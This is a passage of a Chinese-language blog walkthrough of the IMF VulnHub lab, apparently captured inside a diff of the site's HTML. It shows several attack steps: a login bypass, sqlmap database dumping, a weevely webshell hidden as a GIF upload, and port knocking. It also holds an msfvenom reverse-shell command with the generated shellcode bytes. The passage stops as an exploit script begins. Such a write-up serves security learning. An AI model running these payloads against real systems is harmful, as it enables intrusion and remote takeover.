-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091533225_hu70ecdc7c41c082a372659b0af3cdf734_19737_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091533225_hu70ecdc7c41c082a372659b0af3cdf734_19737_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519091533225&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;322&#34;
-		data-flex-basis=&#34;774px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;在首页的登录页面下也是有3个用户提示&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091844321.png&#34;
-	width=&#34;1496&#34;
-	height=&#34;1026&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091844321_hucb105ad0715b2adb4d08bba9f5a6c0e9_183679_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091844321_hucb105ad0715b2adb4d08bba9f5a6c0e9_183679_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519091844321&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;145&#34;
-		data-flex-basis=&#34;349px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;挨个测试,rmichaels 是可以登录的，就是没有密码&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;通过之前的提示知道密码被编码的，那肯定要进行比较，猜测使用strcmp()函数进行对比&lt;/p&gt;
-&lt;p&gt;密码相等的话返回0。如果字符串和数组比较也是会返回0&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519092035881.png&#34;
-	width=&#34;455&#34;
-	height=&#34;262&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519092035881_hu647923ddb2f14e407af83e83a08581d7_10408_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519092035881_hu647923ddb2f14e407af83e83a08581d7_10408_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519092035881&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;173&#34;
-		data-flex-basis=&#34;416px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;抓包，传入数组测试。绕过成功&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;Flag3{Y29udGludWVUT2Ntcw==}&lt;/code&gt;解码continueTOcms&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095226905.png&#34;
-	width=&#34;947&#34;
-	height=&#34;584&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095226905_hu9ee7d87c15b4c914f8367be5b7887524_47014_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095226905_hu9ee7d87c15b4c914f8367be5b7887524_47014_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519095226905&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;162&#34;
-		data-flex-basis=&#34;389px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095300905.png&#34;
-	width=&#34;612&#34;
-	height=&#34;242&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095300905_hu4a3b392eb941e8e890398ebbdeb960a2_17113_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095300905_hu4a3b392eb941e8e890398ebbdeb960a2_17113_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519095300905&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;252&#34;
-		data-flex-basis=&#34;606px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;登录成功后，发现啥都没有&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095628340.png&#34;
-	width=&#34;1158&#34;
-	height=&#34;685&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095628340_hu954fb333047a875a704ced7c680d0fdf_204777_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095628340_hu954fb333047a875a704ced7c680d0fdf_204777_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519095628340&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;169&#34;
-		data-flex-basis=&#34;405px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;尝试爆破二级目录。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101035359.png&#34;
-	width=&#34;773&#34;
-	height=&#34;464&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101035359_hub6cce45d2e29b888ddd8db0dac2d2ec2_203612_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101035359_hub6cce45d2e29b888ddd8db0dac2d2ec2_203612_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519101035359&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;166&#34;
-		data-flex-basis=&#34;399px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;有文件上传的目录，但是没有上传点&lt;/p&gt;
-&lt;p&gt;Url是可以传参的，试试sqlmap&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101435073.png&#34;
-	width=&#34;863&#34;
-	height=&#34;373&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101435073_hu79a4a68d1760f491f32b903fa82bdda1_71251_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101435073_hu79a4a68d1760f491f32b903fa82bdda1_71251_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519101435073&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;231&#34;
-		data-flex-basis=&#34;555px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;sqlmap -u &amp;quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist&amp;quot; --dbs --batch --cookie=&amp;quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6&amp;quot;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;得到数据库，测试admin数据库下的唯一表 pages&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101642745.png&#34;
-	width=&#34;542&#34;
-	height=&#34;189&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101642745_hu200a9470a831cb6a9b72fa63233ed920_86643_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101642745_hu200a9470a831cb6a9b72fa63233ed920_86643_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519101642745&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;286&#34;
-		data-flex-basis=&#34;688px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;sqlmap -u &amp;quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist&amp;quot;  --batch --cookie=&amp;quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6&amp;quot; -D admin  -T pages --dump&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102234579.png&#34;
-	width=&#34;1252&#34;
-	height=&#34;417&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102234579_hu9b412726d0df76a6ce98a4d238f0db09_398261_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102234579_hu9b412726d0df76a6ce98a4d238f0db09_398261_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519102234579&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;300&#34;
-		data-flex-basis=&#34;720px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;访问得知，有一个图片，扫描得到&lt;code&gt;Flag4{dXBsb2Fkcjk0Mi5waHA=}&lt;/code&gt;解码得&lt;code&gt;uploadr942.php&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102401957.png&#34;
-	width=&#34;1182&#34;
-	height=&#34;756&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102401957_hu761ef47d34dc6e09e42e048ad9f8dd62_315973_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102401957_hu761ef47d34dc6e09e42e048ad9f8dd62_315973_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519102401957&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;156&#34;
-		data-flex-basis=&#34;375px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102442082.png&#34;
-	width=&#34;531&#34;
-	height=&#34;671&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102442082_huaaa436227df5eb54c126b7f28a9252f7_90113_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102442082_huaaa436227df5eb54c126b7f28a9252f7_90113_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519102442082&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;79&#34;
-		data-flex-basis=&#34;189px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;访问上传页面目测只能上传图片，并且通过文件头和末尾判断，有htaccess文件&lt;/p&gt;
-&lt;p&gt;使用weevely生成木马 带密码的&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;weevely generate 1234 shell.php&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;在头部添加进行绕过,源码有提示得文件名&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104116909.png&#34;
-	width=&#34;1132&#34;
-	height=&#34;825&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104116909_hu1d1f9b4bdf33b37d0eed273cdceeb997_58022_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104116909_hu1d1f9b4bdf33b37d0eed273cdceeb997_58022_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519104116909&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;137&#34;
-		data-flex-basis=&#34;329px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104126619.png&#34;
-	width=&#34;686&#34;
-	height=&#34;377&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104126619_huba07b4ae6b0d55cc97435dd15d65a1b5_19322_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104126619_huba07b4ae6b0d55cc97435dd15d65a1b5_19322_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519104126619&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;181&#34;
-		data-flex-basis=&#34;436px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;连接木马&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;weevely http://192.168.100.142/imfadministrator/uploads/8cf3502f3c52.gif  1234&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;查看Flag5_abc123def.txt&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205524441.png&#34;
-	width=&#34;873&#34;
-	height=&#34;461&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205524441_hu5c34177960d4eed13caf61ad5de80d4f_400818_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205524441_hu5c34177960d4eed13caf61ad5de80d4f_400818_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220518205524441&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;189&#34;
-		data-flex-basis=&#34;454px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;得到提示&lt;code&gt;echo &amp;quot;YWdlbnRzZXJ2aWNlcw==&amp;quot; | base64 -d&lt;/code&gt;, 还运行着一个叫agent的服务&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205243414.png&#34;
-	width=&#34;585&#34;
-	height=&#34;110&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205243414_hu9cb80bd87c3b5fd4e54e6f93e1833b0b_58619_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205243414_hu9cb80bd87c3b5fd4e54e6f93e1833b0b_58619_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220518205243414&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;531&#34;
-		data-flex-basis=&#34;1276px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;查看同级目录下的文件，接入的端口7482 8279 9467&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205852903.png&#34;
-	width=&#34;532&#34;
-	height=&#34;322&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205852903_huf9bf1c8220aa8750902be9dc9751b5bc_158348_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205852903_huf9bf1c8220aa8750902be9dc9751b5bc_158348_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220518205852903&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;165&#34;
-		data-flex-basis=&#34;396px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;对于Agent这个程序的分析&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://g0blin.co.uk/imf-vulnhub-writeup/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;g0blin Research: IMF VulnHub Writeup&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.icode9.com/content-4-893866.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;OSCP IMF &lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;得知要进行端口敲门，才能进行访问代理的端口&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/382577136&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;端口保护从端口敲门到单包授权&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;方法一：&lt;/p&gt;
-&lt;p&gt;下载工具&lt;code&gt;git clone https://github.com/grongor/knock.git&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;在KALI进行端口敲门测试&amp;hellip;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210544021.png&#34;
-	width=&#34;675&#34;
-	height=&#34;311&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210544021_hu8fd9b31e3ad76d7219d75af32856cd04_179622_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210544021_hu8fd9b31e3ad76d7219d75af32856cd04_179622_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220518210544021&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;217&#34;
-		data-flex-basis=&#34;520px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;方法二：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;使用nc依此对3个端口进行连接，即发送SYN数据包
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -nv 192.168.100.142 &lt;span class=&#34;m&#34;&gt;7482&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -nv 192.168.100.142 &lt;span class=&#34;m&#34;&gt;8279&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -nv 192.168.100.142 &lt;span class=&#34;m&#34;&gt;9467&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;方法三：&lt;/p&gt;
-&lt;p&gt;使用 &lt;code&gt;Scapy&lt;/code&gt;工具或者Python的&lt;code&gt;Scapy.all&lt;/code&gt;模块发送SYN数据包&lt;/p&gt;
-&lt;p&gt;对外开放了一个7788端口&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519112551731.png&#34;
-	width=&#34;523&#34;
-	height=&#34;172&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519112551731_hu62530c49ef86fd074ff6449bc8fce953_64571_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519112551731_hu62530c49ef86fd074ff6449bc8fce953_64571_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519112551731&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;304&#34;
-		data-flex-basis=&#34;729px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210702319.png&#34;
-	width=&#34;921&#34;
-	height=&#34;270&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210702319_hubeb036de457c2b08fea4a6d604f6a2d0_269138_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210702319_hubeb036de457c2b08fea4a6d604f6a2d0_269138_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220518210702319&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;341&#34;
-		data-flex-basis=&#34;818px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;分析Agent知道需要进行溢出&lt;/p&gt;
-&lt;p&gt;生成ShellCode，溢出拿到权限&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.100.101 lport=8877 -f python -b &amp;quot;\x00\x0a\x0d&amp;quot;&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  b&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\xba\x74\x40\x7e\xaf\xda\xd6\xd9\x74\x24\xf4\x58\x29&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\xc9\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x24\x4e\x9c&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x5a\xf5\x95\x97\x46\xa6\x6a\x0b\xe3\x4a\xe4\x4a\x43&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x2c\x3b\x0c\x37\xe9\x73\x32\xf5\x89\x3d\x34\xfc\xe1&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x7d\x6e\x9a\x94\x15\x6d\x63\x74\x4b\xf8\x82\xc8\xf5&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\xab\x15\x7b\x49\x48\x1f\x9a\x60\xcf\x4d\x34\x15\xff&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x02\xac\x81\xd0\xcb\x4e\x3b\xa6\xf7\xdc\xe8\x31\x16&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x50\x05\x8f\x59&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Python脚本&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
